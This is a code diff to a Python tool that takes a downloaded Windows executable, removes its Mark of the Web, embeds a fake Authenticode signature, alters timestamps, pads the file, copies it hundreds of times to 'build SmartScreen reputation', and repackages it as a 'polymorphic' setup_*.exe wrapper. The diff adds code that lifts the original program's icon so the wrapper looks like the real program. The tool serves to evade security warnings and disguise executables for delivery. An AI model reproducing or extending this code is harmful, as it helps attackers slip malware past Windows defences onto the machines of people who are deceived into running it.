@@ -6,12 +6,12 @@ import shutil
 import time
 import random
 import string
-import uuid
 import ctypes
 import struct
 from urllib.parse import urlparse
 from pathlib import Path
 from colorama import init, Fore, Style
+import pefile  # For icon extraction
 
 # Initialize colorama for colored console output
 init()
@@ -103,6 +103,42 @@ def sanitize_filename(url):
         raise ValueError(f"Invalid input: URL must point to an EXE file, got {filename}")
     print(Fore.GREEN + f"[+] Sanitized filename: {filename}" + Style.RESET_ALL)
     return filename
+
+def extract_icon(exe_path, temp_dir):
+    """Extract the icon from the EXE and save it as a .ico file."""
+    print(Fore.GREEN + f"[+] Extracting icon from {exe_path}..." + Style.RESET_ALL)
+    try:
+        pe = pefile.PE(exe_path)
+        icon_path = os.path.join(temp_dir, f"extracted_icon_{generate_random_string()}.ico")
+        
+        # Find the icon resource
+        rt_icon_idx = [entry.id for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries if entry.id == pefile.RESOURCE_TYPE['RT_GROUP_ICON']][0]
+        rt_icon_directory = pe.DIRECTORY_ENTRY_RESOURCE.entries[rt_icon_idx]
+        icon_entry = rt_icon_directory.entries[0]
+        icon_offset = icon_entry.directory.entries[0].data.struct.OffsetToData
+        icon_size = icon_entry.directory.entries[0].data.struct.Size
+        
+        # Extract icon data
+        with open(exe_path, 'rb') as f:
+            f.seek(icon_offset)
+            icon_data = f.read(icon_size)
+        
+        # Save as .ico file
+        with open(icon_path, 'wb') as f:
+            f.write(icon_data)
+        
+        set_file_permissions(icon_path)
+        if not check_file_access(icon_path):
+            print(Fore.RED + f"[+] Error: Cannot access extracted icon: {icon_path}" + Style.RESET_ALL)
+            print(Fore.GREEN + "[+] Continuing without custom icon." + Style.RESET_ALL)
+            return None
+        
+        print(Fore.GREEN + f"[+] Icon extracted to {icon_path}" + Style.RESET_ALL)
+        return icon_path
+    except Exception as e:
+        print(Fore.RED + f"[+] Warning: Failed to extract icon: {e}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] Continuing without custom icon." + Style.RESET_ALL)
+        return None
 
 def embed_fake_signature(file_path, temp_dir):
     """Embed a fake Authenticode signature structure into the EXE."""
@@ -247,35 +283,39 @@ def remove_motw(file_path):
     except Exception as e:
         print(Fore.RED + f"[+] Warning: Error removing MotW: {e}" + Style.RESET_ALL)
 
-def simulate_downloads(file_path, count=500):
+def simulate_downloads(file_path, temp_dir, count=500):
     """Simulate multiple downloads to build reputation with retries for file deletion."""
     print(Fore.GREEN + f"[+] Simulating {count} downloads for {file_path} to build reputation..." + Style.RESET_ALL)
     for i in range(count):
-        temp_path = os.path.join(OUTPUT_DIR, f"temp_{generate_random_string()}.exe")
+        temp_path = os.path.join(temp_dir, f"temp_{generate_random_string()}.exe")
         try:
             shutil.copyfile(file_path, temp_path)
             set_file_permissions(temp_path)
             time.sleep(0.1)  # Increased delay to reduce file system load
             # Retry deletion up to 3 times
-            for attempt in range(3):
-                try:
-                    os.remove(temp_path)
-                    break
-                except PermissionError as e:
-                    print(Fore.RED + f"[+] Warning: Failed to delete {temp_path} (attempt {attempt+1}/3): {e}" + Style.RESET_ALL)
-                    time.sleep(0.5)  # Wait before retrying
-                except Exception as e:
-                    print(Fore.RED + f"[+] Warning: Error deleting {temp_path}: {e}" + Style.RESET_ALL)
-                    break
+            if os.path.exists(temp_path):
+                for attempt in range(3):
+                    try:
+                        os.remove(temp_path)
+                        print(Fore.GREEN + f"[+] Deleted {temp_path}" + Style.RESET_ALL)
+                        break
+                    except PermissionError as e:
+                        print(Fore.RED + f"[+] Warning: Failed to delete {temp_path} (attempt {attempt+1}/3): {e}" + Style.RESET_ALL)
+                        time.sleep(1.0)  # Increased retry delay
+                    except Exception as e:
+                        print(Fore.RED + f"[+] Warning: Error deleting {temp_path}: {e}" + Style.RESET_ALL)
+                        break
+                else:
+                    print(Fore.RED + f"[+] Error: Failed to delete {temp_path} after 3 attempts. Continuing..." + Style.RESET_ALL)
             else:
-                print(Fore.RED + f"[+] Error: Failed to delete {temp_path} after 3 attempts. Continuing..." + Style.RESET_ALL)
+                print(Fore.RED + f"[+] Warning: {temp_path} does not exist. Skipping deletion." + Style.RESET_ALL)
         except Exception as e:
             print(Fore.RED + f"[+] Warning: Error during download simulation for {temp_path}: {e}" + Style.RESET_ALL)
         if (i + 1) % 100 == 0:
             print(Fore.GREEN + f"[+] Simulated download {i+1}/{count}" + Style.RESET_ALL)
     print(Fore.GREEN + "[+] Download simulation complete. This may help build SmartScreen reputation." + Style.RESET_ALL)
 
-def create_exe_wrapper(exe_path, output_dir, original_filename, temp_dir):
+def create_exe_wrapper(exe_path, output_dir, original_filename, temp_dir, icon_path=None):
     """Create a polymorphic EXE wrapper using pyinstaller."""
     print(Fore.GREEN + f"[+] Creating polymorphic EXE wrapper for {exe_path}..." + Style.RESET_ALL)
     wrapper_exe_path = os.path.join(output_dir, f"setup_{generate_random_string()}.exe")
@@ -324,7 +364,7 @@ if __name__ == "__main__":
             os.makedirs(dist_dir, exist_ok=True)
             set_file_permissions(dist_dir)
         
-        # Run pyinstaller with explicit distpath
+        # Run pyinstaller with explicit distpath and optional icon
         cmd = [
             "pyinstaller",
             "--onefile",
@@ -333,8 +373,11 @@ if __name__ == "__main__":
             f"--add-data={dummy_file};readme.txt",
             f"--distpath={dist_dir}",
             "--noconfirm",
-            temp_script_path
         ]
+        if icon_path:
+            cmd.append(f"--icon={icon_path}")
+        cmd.append(temp_script_path)
+        
         print(Fore.GREEN + f"[+] Executing pyinstaller command: {' '.join(cmd)}" + Style.RESET_ALL)
         
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
@@ -396,12 +439,13 @@ def main():
         print(Fore.GREEN + f"[+] Temporary directory created at {temp_dir}" + Style.RESET_ALL)
         
         exe_path, original_filename = download_exe(EXE_URL, OUTPUT_DIR)
+        icon_path = extract_icon(exe_path, temp_dir)
         remove_motw(exe_path)
         signed_exe_path = embed_fake_signature(exe_path, temp_dir)
         timestamped_exe_path = modify_timestamp(signed_exe_path)
         padded_exe_path = pad_file(timestamped_exe_path, temp_dir)
-        simulate_downloads(padded_exe_path, count=500)
-        final_exe_path = create_exe_wrapper(padded_exe_path, OUTPUT_DIR, original_filename, temp_dir)
+        simulate_downloads(padded_exe_path, temp_dir, count=500)
+        final_exe_path = create_exe_wrapper(padded_exe_path, OUTPUT_DIR, original_filename, temp_dir, icon_path)
         
         final_output_path = os.path.join(OUTPUT_DIR, original_filename)
         shutil.move(final_exe_path, final_output_path)
